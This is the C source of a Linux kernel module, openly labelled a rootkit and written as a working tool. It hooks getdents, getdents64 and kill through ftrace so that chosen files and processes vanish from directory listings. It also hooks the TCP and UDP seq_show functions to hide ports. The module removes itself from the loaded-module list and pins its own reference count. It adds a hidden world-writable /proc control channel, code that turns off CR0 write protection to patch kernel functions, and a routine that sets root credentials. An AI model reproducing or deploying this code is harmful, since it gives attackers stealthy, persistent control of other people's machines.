#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/kallsyms.h>
#include <linux/dirent.h>
#include <linux/limits.h>
#include <linux/tcp.h>
#include <linux/fs.h>
#include <linux/proc_fs.h>
#include <linux/seq_file.h>
#include <linux/types.h>
#include <linux/signal.h>

#include "ftrace_hook.h"

#define MAX_LENGTH 256

#define PREFIX "test"

#define true 1
#define false 0

#define ERROR_HANDLE(buffer1, ret) \
    {kfree(buffer1); return (ret);}

#define exist(name, param) \
    exist_##name((param))

static long orig_cr0 = 0;

void mywrite_cr0(unsigned long cr0) {
    asm volatile("mov %0,%%cr0" : "+r"(cr0));
}

void disable_write_protection(void) {
    orig_cr0 = read_cr0();
    mywrite_cr0(orig_cr0 & (~0x10000)); //set wp to 0
}

void enable_write_protection(void) {
    mywrite_cr0(orig_cr0);          //set wp to 1
}

static asmlinkage long (*orig_kill)(const struct pt_regs *);

static asmlinkage long (*orig_getdents64)(const struct pt_regs *);
static asmlinkage long (*orig_getdents)(const struct pt_regs *);

static asmlinkage int (*orig_tcp4_seq_show)(struct seq_file *seq, void *v);
static asmlinkage int (*orig_tcp6_seq_show)(struct seq_file *seq, void *v);
static asmlinkage int (*orig_udp4_seq_show)(struct seq_file *seq, void *v);
static asmlinkage int (*orig_udp6_seq_show)(struct seq_file *seq, void *v);

static int hidden = 0;

static char hide_pid[NAME_MAX];

static struct list_head *prev_module;

static char *str;

struct proc_dir_entry {
	/*
	 * number of callers into module in progress;
	 * negative -> it's going away RSN
	 */
	atomic_t in_use;
	refcount_t refcnt;
	struct list_head pde_openers;	/* who did ->open, but not ->release */
	/* protects ->pde_openers and all struct pde_opener instances */
	spinlock_t pde_unload_lock;
	struct completion *pde_unload_completion;
	const struct inode_operations *proc_iops;
	const struct file_operations *proc_fops;
	const struct dentry_operations *proc_dops;
	union {
		const struct seq_operations *seq_ops;
		int (*single_show)(struct seq_file *, void *);
	};
	proc_write_t write;
	void *data;
	unsigned int state_size;
	unsigned int low_ino;
	nlink_t nlink;
	kuid_t uid;
	kgid_t gid;
	loff_t size;
	struct proc_dir_entry *parent;
	struct rb_root subdir;
	struct rb_node subdir_node;
	char *name;
	umode_t mode;
	u8 namelen;
	char inline_name[];
} __randomize_layout;


struct hide_files {
    char name[NAME_MAX];
    struct list_head list;
};

struct hide_pids {
    char name[10];
    struct list_head list;
};

struct hide_ports {
    unsigned short port;
    struct list_head list;
};

/* ---------------hide module start ----------------*/
static void hideme(void) {
    prev_module = THIS_MODULE->list.prev;
    list_del(&THIS_MODULE->list);
}

static void showme(void) {
    list_add_tail(&THIS_MODULE->list, prev_module);
}

static int hide_module(void) {
    if (hidden == 0) {
        printk(KERN_INFO "rootkit: hideme...\n");
        hideme();
        hidden = 1;
    } else {
        printk(KERN_INFO "rootkit: showme...\n");
        showme();
        hidden = 0;
    }
    return 0;
}

/* ---------------hide module end ----------------*/


/* ---------------hook getdents start------------------*/ 
LIST_HEAD(hide_files_list);
LIST_HEAD(hide_pids_list);

static unsigned int find_file(char *target) {
    struct hide_files *h;
    list_for_each_entry(h, &hide_files_list, list) {
        if (memcmp(h->name, target, strlen(h->name)) == 0) {
            return true;
        }
    }
    return false;
}

static unsigned int find_pid(char *target) {
    struct hide_pids *h;
    list_for_each_entry(h, &hide_pids_list, list) {
        if (strlen(h->name) == strlen(target) && memcmp(h->name, target, strlen(h->name)) == 0) 
            return true;
    }
    return false;
}

// sys_getdents64与隐藏文件的区别是，需要判断hide_pid是不是为空
static asmlinkage long hook_sys_getdents64(const struct pt_regs * regs) {
    struct linux_dirent64 *current_dir, *previous_dir, *dirent_ker = NULL;
    unsigned long offset_ker = 0;

    long error;

    int ret = orig_getdents64(regs);

    struct linux_dirent64 __user *dirent = (struct linux_dirent64 *)regs->si;

    dirent_ker = kzalloc(ret, GFP_KERNEL);
    if ((ret <= 0) || (dirent_ker == NULL))
        return ret;

    error = copy_from_user(dirent_ker, dirent, ret);
    if (error)
        ERROR_HANDLE(dirent_ker, ret);

    while (offset_ker < ret) {
        current_dir = (void *)dirent_ker + offset_ker;
        if (find_file(current_dir->d_name) || find_pid(current_dir->d_name)) {
            if (current_dir == dirent_ker) {
                ret -= current_dir->d_reclen;
                memmove(current_dir, (void *)current_dir + current_dir->d_reclen, ret);
                continue;
            }
            previous_dir->d_reclen += current_dir->d_reclen;
        } else {
            previous_dir = current_dir;
        }
        offset_ker += current_dir->d_reclen;
    }
    error = copy_to_user(dirent, dirent_ker, ret);
    if (error)
        ERROR_HANDLE(dirent_ker, ret);
    kfree(dirent_ker);
    return ret;
}

static asmlinkage long hook_sys_getdents(const struct pt_regs * regs) {
    struct linux_dirent {
        unsigned long d_ino;
        unsigned long d_off;
        unsigned short d_reclen;
        char d_name[];
    };
    struct linux_dirent __user *dirent = (struct linux_dirent *) regs->si;
    struct linux_dirent *current_dir, *previous_dir, *dirent_ker = NULL; 
    unsigned long offset_ker = 0;

    long error;

    int ret = orig_getdents(regs);
    dirent_ker = kzalloc(ret, GFP_KERNEL);

    if ((ret <= 0) || (dirent_ker == NULL))
        return ret;

    error = copy_from_user(dirent_ker, dirent, ret);
    if (error)
        ERROR_HANDLE(dirent_ker, ret);
    
    while (offset_ker < ret) {
        current_dir = (void *)dirent_ker + offset_ker;
        if (find_file(current_dir->d_name) || find_pid(current_dir->d_name)) {
            if (current_dir == dirent_ker) {
                ret -= current_dir->d_reclen;
                memmove(current_dir, (void *)current_dir + current_dir->d_reclen, ret);
                continue;
            }
            previous_dir->d_reclen += current_dir->d_reclen;
        } else {
            previous_dir = current_dir;
        }
        offset_ker += current_dir->d_reclen;
    }
    error = copy_to_user(dirent, dirent_ker, ret);
    if (error)
        ERROR_HANDLE(dirent_ker, ret);
    kfree(dirent_ker);
    return ret;
}

/* ---------------hook getdents end------------------*/ 

/*---------------hook kill start-------------------*/
static asmlinkage int hook_kill(const struct pt_regs *regs) {
    int sig = regs->si;
    pid_t pid = regs->di;

    if (sig == 64) {
        printk(KERN_INFO "signal received ...\n");
        if (pid == 0)
            return hide_module();
        else {
            printk(KERN_INFO "rootkit: hiding process with pid %d\n", pid);
            sprintf(hide_pid, "%d", pid);
            // printk(KERN_INFO "hide_pid: %s\n", hide_pid);
            return 0;
        }
    }

    return orig_kill(regs);
}
/*---------------hook kill end-------------------*/

/*---------------hide port start------------------*/
LIST_HEAD(hide_ports_list);

static unsigned int find_port(unsigned short sport, unsigned short dport) {
    struct hide_ports *h;
    unsigned short port;
    list_for_each_entry(h, &hide_ports_list, list) {
        //printk(KERN_INFO "find_port: %d\n", h->port);
        port = htons(h->port);
        if (port == sport || port == dport) {
            return true;
        }
    }
    return false;
}
 
static asmlinkage int hook_tcp4_seq_show(struct seq_file *seq, void *v) {
    struct inet_sock *is;
    //unsigned short port = htons(5700);

    if (v != SEQ_START_TOKEN) {
        is = (struct inet_sock *)v;
        if (find_port(is->inet_sport, is->inet_dport)) {
            printk(KERN_DEBUG "rootkit: sport: %d, dport: %d\n", ntohs(is->inet_sport), ntohs(is->inet_dport));
            return 0;
        }
    }

    // if (v != SEQ_START_TOKEN) {
    //     is = (struct inet_sock *)v;
    //     if (port == is->inet_sport || port == is->inet_dport) {
    //         printk(KERN_DEBUG "rootkit: sport: %d, dport: %d\n", ntohs(is->inet_sport), ntohs(is->inet_dport));
    //         return 0;
    //     }
    // }
    return orig_tcp4_seq_show(seq, v);
}

static asmlinkage int hook_tcp6_seq_show(struct seq_file *seq, void *v) {
    struct inet_sock *is;
    // unsigned short port = htons(5700);
    if (v != SEQ_START_TOKEN) {
        is = (struct inet_sock *)v;
        if (find_port(is->inet_sport, is->inet_dport)) {
            printk(KERN_DEBUG "rootkit: sport: %d, dport: %d\n", ntohs(is->inet_sport), ntohs(is->inet_dport));
            return 0;
        }
    }
    return orig_tcp6_seq_show(seq, v);
}

static asmlinkage int hook_udp4_seq_show(struct seq_file *seq, void *v) {
    struct inet_sock *is;
    // unsigned short port = htons(111);
    if (v != SEQ_START_TOKEN) {
        is = (struct inet_sock *)v;
        if (find_port(is->inet_sport, is->inet_dport)) {
            printk(KERN_DEBUG "rootkit: sport: %d, dport: %d\n", ntohs(is->inet_sport), ntohs(is->inet_dport));
            return 0;
        }
    }
    return orig_udp4_seq_show(seq, v);
}

static asmlinkage int hook_udp6_seq_show(struct seq_file *seq, void *v) {
    struct inet_sock *is;
    // unsigned short port = htons(111);
    if (v != SEQ_START_TOKEN) {
        is = (struct inet_sock *)v;
        if (find_port(is->inet_sport, is->inet_dport)) {
            printk(KERN_DEBUG "rootkit: sport: %d, dport: %d\n", ntohs(is->inet_sport), ntohs(is->inet_dport));
            return 0;
        }
    }
    return orig_udp6_seq_show(seq, v);
}
/*---------------hide port end------------------*/


/*---------------rootkit protect start----------------*/

static void rootkit_protect(void) {
    try_module_get(THIS_MODULE);
}

static void rootkit_unload(void) {
    module_put(THIS_MODULE);
}

/*---------------rootkit protect end------------------*/

static struct hide_ports* exist_hide_ports(unsigned short port) {
    struct hide_ports *h;
    list_for_each_entry(h, &hide_ports_list, list) {
        if (port == h->port)
            return h;
    }
    return NULL;
}

static struct hide_files* exist_hide_files(char *target) {
    struct hide_files *h;
    list_for_each_entry(h, &hide_files_list, list) {
        if (strcmp(h->name, target) == 0) 
            return h;
    }
    return NULL;
}

static struct hide_pids* exist_hide_pids(char *target) {
    struct hide_pids *h;
    list_for_each_entry(h, &hide_pids_list, list) {
        if (strcmp(h->name, target) == 0)
            return h;
    }
    return NULL;
}

static unsigned int execute(char *cmd, int idx) {
    unsigned short port;
    struct hide_ports *new_port, *target;
    struct hide_files *new_file, *target_file;
    struct hide_pids *new_pid, *target_pid;
    int i;
    while (idx < strlen(str) && str[idx] ==' ')
        idx++;
    if (strcmp(cmd, "hide_port") == 0) {
        if (kstrtou16((char *) str + idx, 10, &port) == 0) {
            printk(KERN_INFO "port: %d\n", port);
            if (exist(hide_ports, port) == NULL) {
                new_port = kmalloc(sizeof(struct hide_ports), GFP_KERNEL);
                new_port->port = port;
                list_add(&new_port->list, &hide_ports_list);
            }
        } else {
            printk(KERN_DEBUG "wrong cmd: %s, wrong port: %s\n", cmd, (char *)str + idx);
            return false;
        }
    } else if (strcmp(cmd, "unhide_port") == 0) {
        if (kstrtou16((char *) str + idx, 10, &port) == 0) {
            printk(KERN_INFO "port: %d\n", port);
            target = exist(hide_ports, port);
            if (target != NULL) 
                list_del(&target->list);
        } else {
            printk(KERN_DEBUG "wrong cmd: %s, wrong port: %s\n", cmd, (char *)str + idx);
            return false;
        }
    } else if (strcmp(cmd, "hide_file") == 0) {
        for (i = idx; i < strlen(str); i++) 
            if (str[i] == '\n' || str[i] == '\r' || str[i] == ' ')
                str[i] = '\0';
        if (exist(hide_files, (char *)str + idx) == NULL) {
            new_file = kmalloc(sizeof(struct hide_files), GFP_KERNEL);
            // new_file = kmalloc(NAME_MAX, GFP_KERNEL);
            memcpy(new_file->name, (char *)str + idx, strlen(str) - idx);
            //printk(KERN_INFO "para: %s\n, len: %d", new_file->name, strlen(new_file->name));
            list_add(&new_file->list, &hide_files_list);
        } 
    } else if (strcmp(cmd, "unhide_file") == 0) {
        for (i = idx; i < strlen(str); i++) 
            if (str[i] == '\n' || str[i] == '\r' || str[i] == ' ')
                str[i] = '\0';
        target_file = exist(hide_files, (char *)str + idx);
        if (target_file != NULL) {
            list_del(&target_file->list);
        }
    } else if (strcmp(cmd, "hide_pid") == 0) {
        for (i = idx; i < strlen(str); i++) 
            if (str[i] == '\n' || str[i] == '\r' || str[i] == ' ')
                str[i] = '\0';
        if (exist(hide_pids, (char *)str + idx) == NULL) {
            new_pid = kmalloc(sizeof(struct hide_pids), GFP_KERNEL);
            memcpy(new_pid->name, (char *)str + idx, strlen(str) - idx);
            list_add(&new_pid->list, &hide_pids_list);
        }
    } else if (strcmp(cmd, "unhide_pid") == 0) {
        for (i = idx; i < strlen(str); i++)
            if (str[i] == '\n' || str[i] == '\r' || str[i] == ' ')
                str[i] = '\0';
        target_pid = exist(hide_pids, (char *)str + idx);
        if (target_pid != NULL) {
            list_del(&target_pid->list);
        }
    } else if (strcmp(cmd, "unload") == 0) {
        rootkit_unload();
    } else {
        printk(KERN_INFO "unsupported behaviour: %s\n", str);
        return false;
    }
    return true;
}

/*---------------read and write on proc start-----------------*/

static ssize_t write(struct file *file, const char __user *buffer, size_t count, loff_t *f_pos) {
    int i;
    char *cmd;    
    memset(str, 0x0, 100);
    if (copy_from_user(str, buffer, count)) {
        return -1;
    }
    
    for (i = 0; i < strlen(str); i++) {
        if (*(str + i) == ' ' || *(str + i) == '\r' || *(str + i) == '\n')
            break;
    }
    cmd = kzalloc(i + 1, GFP_KERNEL);
    strncpy(cmd, str, i);
    cmd[i] = '\0';
    if (!execute(cmd, i + 1)) {
        return count;
    }

    printk(KERN_INFO "write from user: %s\n", str);
    return count;
}

// static ssize_t fops_read(struct file *file, char __user *buffer, size_t count, loff_t *f_pos) {
//     printk(KERN_INFO "fops_read\n");
//     return orig_read(file, buffer, count, f_pos);
// }

static int proc_show(struct seq_file *m, void *v) {
    seq_printf(m, str);
    return 0;
}

static int proc_open(struct inode *inode, struct file *file) {
    return single_open(file, &proc_show, NULL);
}

static const struct file_operations file_fops = {
    .write = write,
    .owner = THIS_MODULE,
    .open = proc_open,
    .read = seq_read,
    .llseek = seq_lseek,
    .release = single_release,
};
/*---------------read and write on proc end----------------*/

/*---------------setup_channel---------------------------*/
static struct rb_node *entry;

    // mov rax 0x0000000000000000    \x48\xb8\x00\x00\x00\x00\x00\x00\x00\x00
    // jmp rax \xff\xe0
static char *hook_code = "\x48\xb8\x00\x00\x00\x00\x00\x00\x00\x00\xff\xe0";

static ssize_t (*orig_write) (struct file *, const char __user *, size_t, loff_t *);
char original_code[sizeof(hook_code) - 1];

static ssize_t fops_write(struct file *file, const char __user *buffer, size_t count, loff_t *f_pos);

void hook_proc_rw(void) {
    disable_write_protection();
    memcpy(original_code, orig_write, sizeof(hook_code) - 1);
    memcpy(orig_write, hook_code, sizeof(hook_code) - 1);
    //orig_write[2] = fops_write;
    *(void **)&((char *)orig_write)[2] = fops_write;
    enable_write_protection();
}

void unhook_proc_rw(void) {
    disable_write_protection();
    memcpy(orig_write, original_code, sizeof(hook_code) - 1);
    enable_write_protection();
}

static ssize_t fops_write(struct file *file, const char __user *buffer, size_t count, loff_t *f_pos) {
    printk(KERN_INFO "fops_write\n");
    int i;
    char *cmd;    
    ssize_t ret;
    memset(str, 0x0, 100);
    if (copy_from_user(str, buffer, count)) {
        return -1;
    }
    
    for (i = 0; i < strlen(str); i++) {
        if (*(str + i) == ' ' || *(str + i) == '\r' || *(str + i) == '\n')
            break;
    }
    cmd = kzalloc(i + 1, GFP_KERNEL);
    strncpy(cmd, str, i);
    cmd[i] = '\0';
    if (execute(cmd, i + 1))
        return count;
    
    unhook_proc_rw();
    ret = orig_write(file, buffer, count, f_pos);
    hook_proc_rw();
    return ret;
}

static int setup_channel(void) {
    //struct rb_node *entry;
    const struct file_operations proc_file_fops;
    struct file_operations *proc_fops;
    struct proc_dir_entry *proc_entry = proc_create("tmp", 0444, NULL, &proc_file_fops);

    proc_entry = proc_entry->parent;
    //printk(KERN_INFO "%s", proc_entry->name);
    // BUG_ON(memcmp(proc_entry->name, "/proc", 5) == 0);

    // find /proc/version
    entry = rb_first(&proc_entry->subdir);
    while (entry) {
        if (strcmp(rb_entry(entry, struct proc_dir_entry, subdir_node)->name, "version") == 0) {
            proc_fops = (struct file_operations *) rb_entry(entry, struct proc_dir_entry, subdir_node)->proc_fops;
            goto found;
        }
        entry = rb_next(entry);
    }
    // unreachable code
    return -1;

found:
    printk(KERN_INFO "found\n ");
    if (proc_fops->write) {
        hook_proc_rw();
        // orig_write = proc_fops->write;
        // proc_fops->write = fops_write;
    } 

    // if (proc_fops->read) {
    //     orig_read = proc_fops->read;
    //     proc_fops->read = fops_read;
    // }
    
    if (!proc_fops->write) {
        printk(KERN_INFO "/proc/version has no write nor read function\n");
        return -1;
    }
    return 0;
}

void set_root(void)
{
    /* prepare_creds returns the current credentials of the process */
    struct cred *root;
    root = prepare_creds();

    if (root == NULL)
        return;

    /* Run through and set all the various *id's to 0 (root) */
    root->uid.val = root->gid.val = 0;
    root->euid.val = root->egid.val = 0;
    root->suid.val = root->sgid.val = 0;
    root->fsuid.val = root->fsgid.val = 0;

    /* Set the cred struct that we've modified to that of the calling process */
    commit_creds(root);
}

static struct ftrace_hook hooks[] = {
    HOOK("__x64_sys_getdents64", hook_sys_getdents64, &orig_getdents64),
    HOOK("__x64_sys_getdents", hook_sys_getdents, &orig_getdents),

    HOOK("__x64_sys_kill", hook_kill, &orig_kill),

    HOOK("tcp4_seq_show", hook_tcp4_seq_show, &orig_tcp4_seq_show),
    HOOK("tcp6_seq_show", hook_tcp6_seq_show, &orig_tcp6_seq_show),
    HOOK("udp4_seq_show", hook_udp4_seq_show, &orig_udp4_seq_show),
    HOOK("udp6_seq_show", hook_udp6_seq_show, &orig_udp6_seq_show),
};

static int __init rootkit_init(void) {
    int err;
    struct proc_dir_entry *entry;
    struct hide_files *chan;
    // set_root();
    // setup_channel();
    // printk(KERN_INFO "setup_channel successfully\n");
    // create channel under /proc
    str = kzalloc(100, GFP_KERNEL);
    entry = proc_create("channel", 0666, NULL, &file_fops);
    if (!entry) {
        printk(KERN_INFO "channel create error\n");
        return -1;
    } else {
        printk(KERN_INFO "channel create successfully\n");
    }
    chan = kmalloc(sizeof(struct hide_files), GFP_KERNEL);
    memcpy(chan->name, "channel", 8);
    list_add(&chan->list, &hide_files_list);

    //hook syscalls in kernel
    err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
    if (err) {
        printk(KERN_INFO "fh_install_hooks error: %d\n", err);
        return err;
    }

    rootkit_protect();
 
    printk(KERN_INFO "rootkit: Loaded :-)\n");
    return 0;
}

static void __exit rootkit_exit(void) {
    static struct file_operations *proc_fops;
    fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
    remove_proc_entry("channel", NULL);
    // proc_fops = (struct file_operations *) rb_entry(entry, struct proc_dir_entry, subdir_node)->proc_fops;
    // proc_fops->write = orig_write;
    printk(KERN_INFO "rootkit: Unloaded :-(\n");
}

module_init(rootkit_init);
module_exit(rootkit_exit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("clf");
MODULE_DESCRIPTION("rootkit");
MODULE_VERSION("0.01");